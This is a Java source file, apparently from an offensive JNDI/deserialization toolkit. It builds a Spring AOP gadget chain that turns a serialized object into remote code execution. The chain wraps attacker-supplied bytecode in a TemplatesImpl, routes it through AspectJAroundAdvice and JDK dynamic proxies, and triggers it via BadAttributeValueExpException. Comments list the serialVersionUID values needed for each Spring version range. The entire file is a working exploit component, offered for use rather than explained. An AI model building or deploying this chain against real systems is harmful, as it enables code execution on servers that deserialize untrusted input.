package sonomon.jndi.deser.gadgets;

import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.Advisor;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAdvisorChainFactory;
import org.springframework.aop.support.DefaultIntroductionAdvisor;
import org.springframework.aop.target.SingletonTargetSource;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;
import sonomon.jndi.deser.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

public abstract class SpringAOP implements SerializeObject {
	
	protected String sUID ;
	protected static boolean isSUIDModified = false;
	//spring-aop-5.3.27.jar+aspectjweaver-1.9.6.jar

	// spring-aop<4.3.0            AbstractAspectJAdvice未实现Serializable
	// 4.3.0<=spring-aop<=5.3.21   3356474919692123037
	// 5.3.22<=spring-aop<=5.3.39  8414315576825681772
	// spring-aop>6.0.0            还是8414315576825681772,但需要jdk17
	
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(tempImpl);
        
        modifySUID();
        
        AbstractAspectJAdvice aspectJAroundAdvice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(aspectJAroundAdvice,"aspectInstanceFactory",singletonAspectInstanceFactory);
        Reflections.setFieldValue(aspectJAroundAdvice, "declaringClass", TemplatesImpl.class);
        Reflections.setFieldValue(aspectJAroundAdvice, "methodName", "newTransformer");  
        Reflections.setFieldValue(aspectJAroundAdvice,"parameterTypes", new Class[0]);
        
        Method targetMethod = TemplatesImpl.class.getMethod("newTransformer");
        Reflections.setFieldValue(aspectJAroundAdvice,"aspectJAdviceMethod",targetMethod);
        
        
        AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
        Reflections.setFieldValue(aspectJAroundAdvice,"pointcut",aspectJExpressionPointcut);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointArgumentIndex",-1);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointStaticPartArgumentIndex",-1);
    	
        
        InvocationHandler jdkDynamicAopProxy1 = jdkDynamicAopProxyNode_makeGadget(aspectJAroundAdvice);
        
        Object proxy1 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Advisor.class, MethodInterceptor.class}, jdkDynamicAopProxy1);
        
        Advisor advisor = new DefaultIntroductionAdvisor((Advice) proxy1);
        ArrayList<Advisor> advisors = new ArrayList<Advisor>();
        advisors.add(advisor);
        
        AdvisedSupport advisedSupport = new AdvisedSupport();
        Reflections.setFieldValue(advisedSupport,"advisors",advisors);
        DefaultAdvisorChainFactory advisorChainFactory = new DefaultAdvisorChainFactory();
        Reflections.setFieldValue(advisedSupport,"advisorChainFactory",advisorChainFactory);
        
        InvocationHandler jdkDynamicAopProxy2 = jdkDynamicAopProxyNode_makeGadget("foo",advisedSupport);
        Object proxy2 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, jdkDynamicAopProxy2);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val,"val",proxy2);

        return val;
    }
	
	
	

	protected abstract void modifySUID();




	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	
    public static InvocationHandler jdkDynamicAopProxyNode_makeGadget(Object obj) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor<?> constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler jdkDynamicAopProxy1 = (InvocationHandler) constructoraop.newInstance(advisedSupport);
        return jdkDynamicAopProxy1;
	}
    
    public static InvocationHandler jdkDynamicAopProxyNode_makeGadget(Object obj, AdvisedSupport as) throws Exception {
    	as.setTargetSource(new SingletonTargetSource(obj));
        Constructor<?> constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler jdkDynamicAopProxy1 = (InvocationHandler) constructoraop.newInstance(as);
        return jdkDynamicAopProxy1;
	}
}